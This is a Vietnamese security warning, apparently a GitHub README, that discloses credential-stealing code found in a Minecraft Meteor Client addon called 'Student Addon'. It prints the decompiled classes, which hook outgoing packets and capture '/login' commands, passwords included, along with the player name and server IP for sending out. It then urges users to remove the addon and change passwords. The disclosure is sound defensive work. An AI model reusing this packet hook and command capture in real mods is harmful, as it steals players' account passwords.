# Student Addon có mã độc
Trước tiên những ae nào đã cài và sử dụng thì tôi khuyên nên xóa và dọn base ngay đi nhé!! à đổi pass nữa
Bọn tôi đã kiểm tra và phát hiện 1 class gửi info player tại: ``addon.commands.CommandHandler``

nội dung bên trong class:
```java
package com.example.addon.commands;

import com.example.addon.utils.FakeCode;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.packets.PacketEvent.Send;
import net.minecraft.class_2596;
import net.minecraft.class_2797;
import net.minecraft.class_7472;

public class CommandHandler {
   public static String extract(Send event) {
      class_2596 var3 = event.packet;
      if (var3 instanceof class_7472) {
         class_7472 packet = (class_7472)var3;
         return packet.comp_808();
      } else {
         var3 = event.packet;
         if (var3 instanceof class_2797) {
            class_2797 packet = (class_2797)var3;
            String msg = packet.comp_945();
            if (msg.startsWith("/")) {
               return msg.substring(1);
            }
         }

         return null;
      }
   }

   public static void handle(String command) {
      String cmd = command.toLowerCase();
      if (cmd.startsWith("l") || cmd.startsWith("dn") || cmd.startsWith("login")) {
         String playerName = MeteorClient.mc.field_1724 != null ? MeteorClient.mc.field_1724.method_5477().getString() : "Unknown";
         String serverIP = MeteorClient.mc.method_1558() != null ? MeteorClient.mc.method_1558().field_3761 : "Singleplayer";
         FakeCode.send("**Player:** " + playerName + "\n**Server:** " + serverIP + "\n**Command:** /" + command);
      }

   }
}

```

có thể thấy addon này đã thu thập các thông tin như: **playerName, serverIP, command** nếu lệnh đó bắt đầu từ chữ: l,dn,login<br>
**lưu ý:** class này thu thập các lệnh bạn nhập ví dụ: /login abcxyz

còn class này là hook vào để bắt các packet
```java 
package com.example.addon.commands;

import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.packets.PacketEvent.Send;
import meteordevelopment.orbit.EventHandler;

public class TagetHub {
   public static final TagetHub INSTANCE = new TagetHub();

   private TagetHub() {
      MeteorClient.EVENT_BUS.subscribe(this);
   }

   public static TagetHub getInstance() {
      return INSTANCE;
   }

   @EventHandler
   private void onPacket(Send event) {
      String command = CommandHandler.extract(event);
      if (command != null) {
         CommandHandler.handle(command);
      }
   }
}
```

## Dev của addon đã tự nhận việc mình đã thu thập hơn 200 thông tin của user

**Bằng chứng bên dưới:**

![Preview](https://github.com/Notkenftr/Student-Addon-Security-Warning/raw/main/IMG_1358.png)

## Trả lời 1 số câu hỏi nếu bạn có hỏi
1. Vì sao lại là com.example ?
-> vì mình đã sài 1 web để decompile .jar ra và nó tự đổi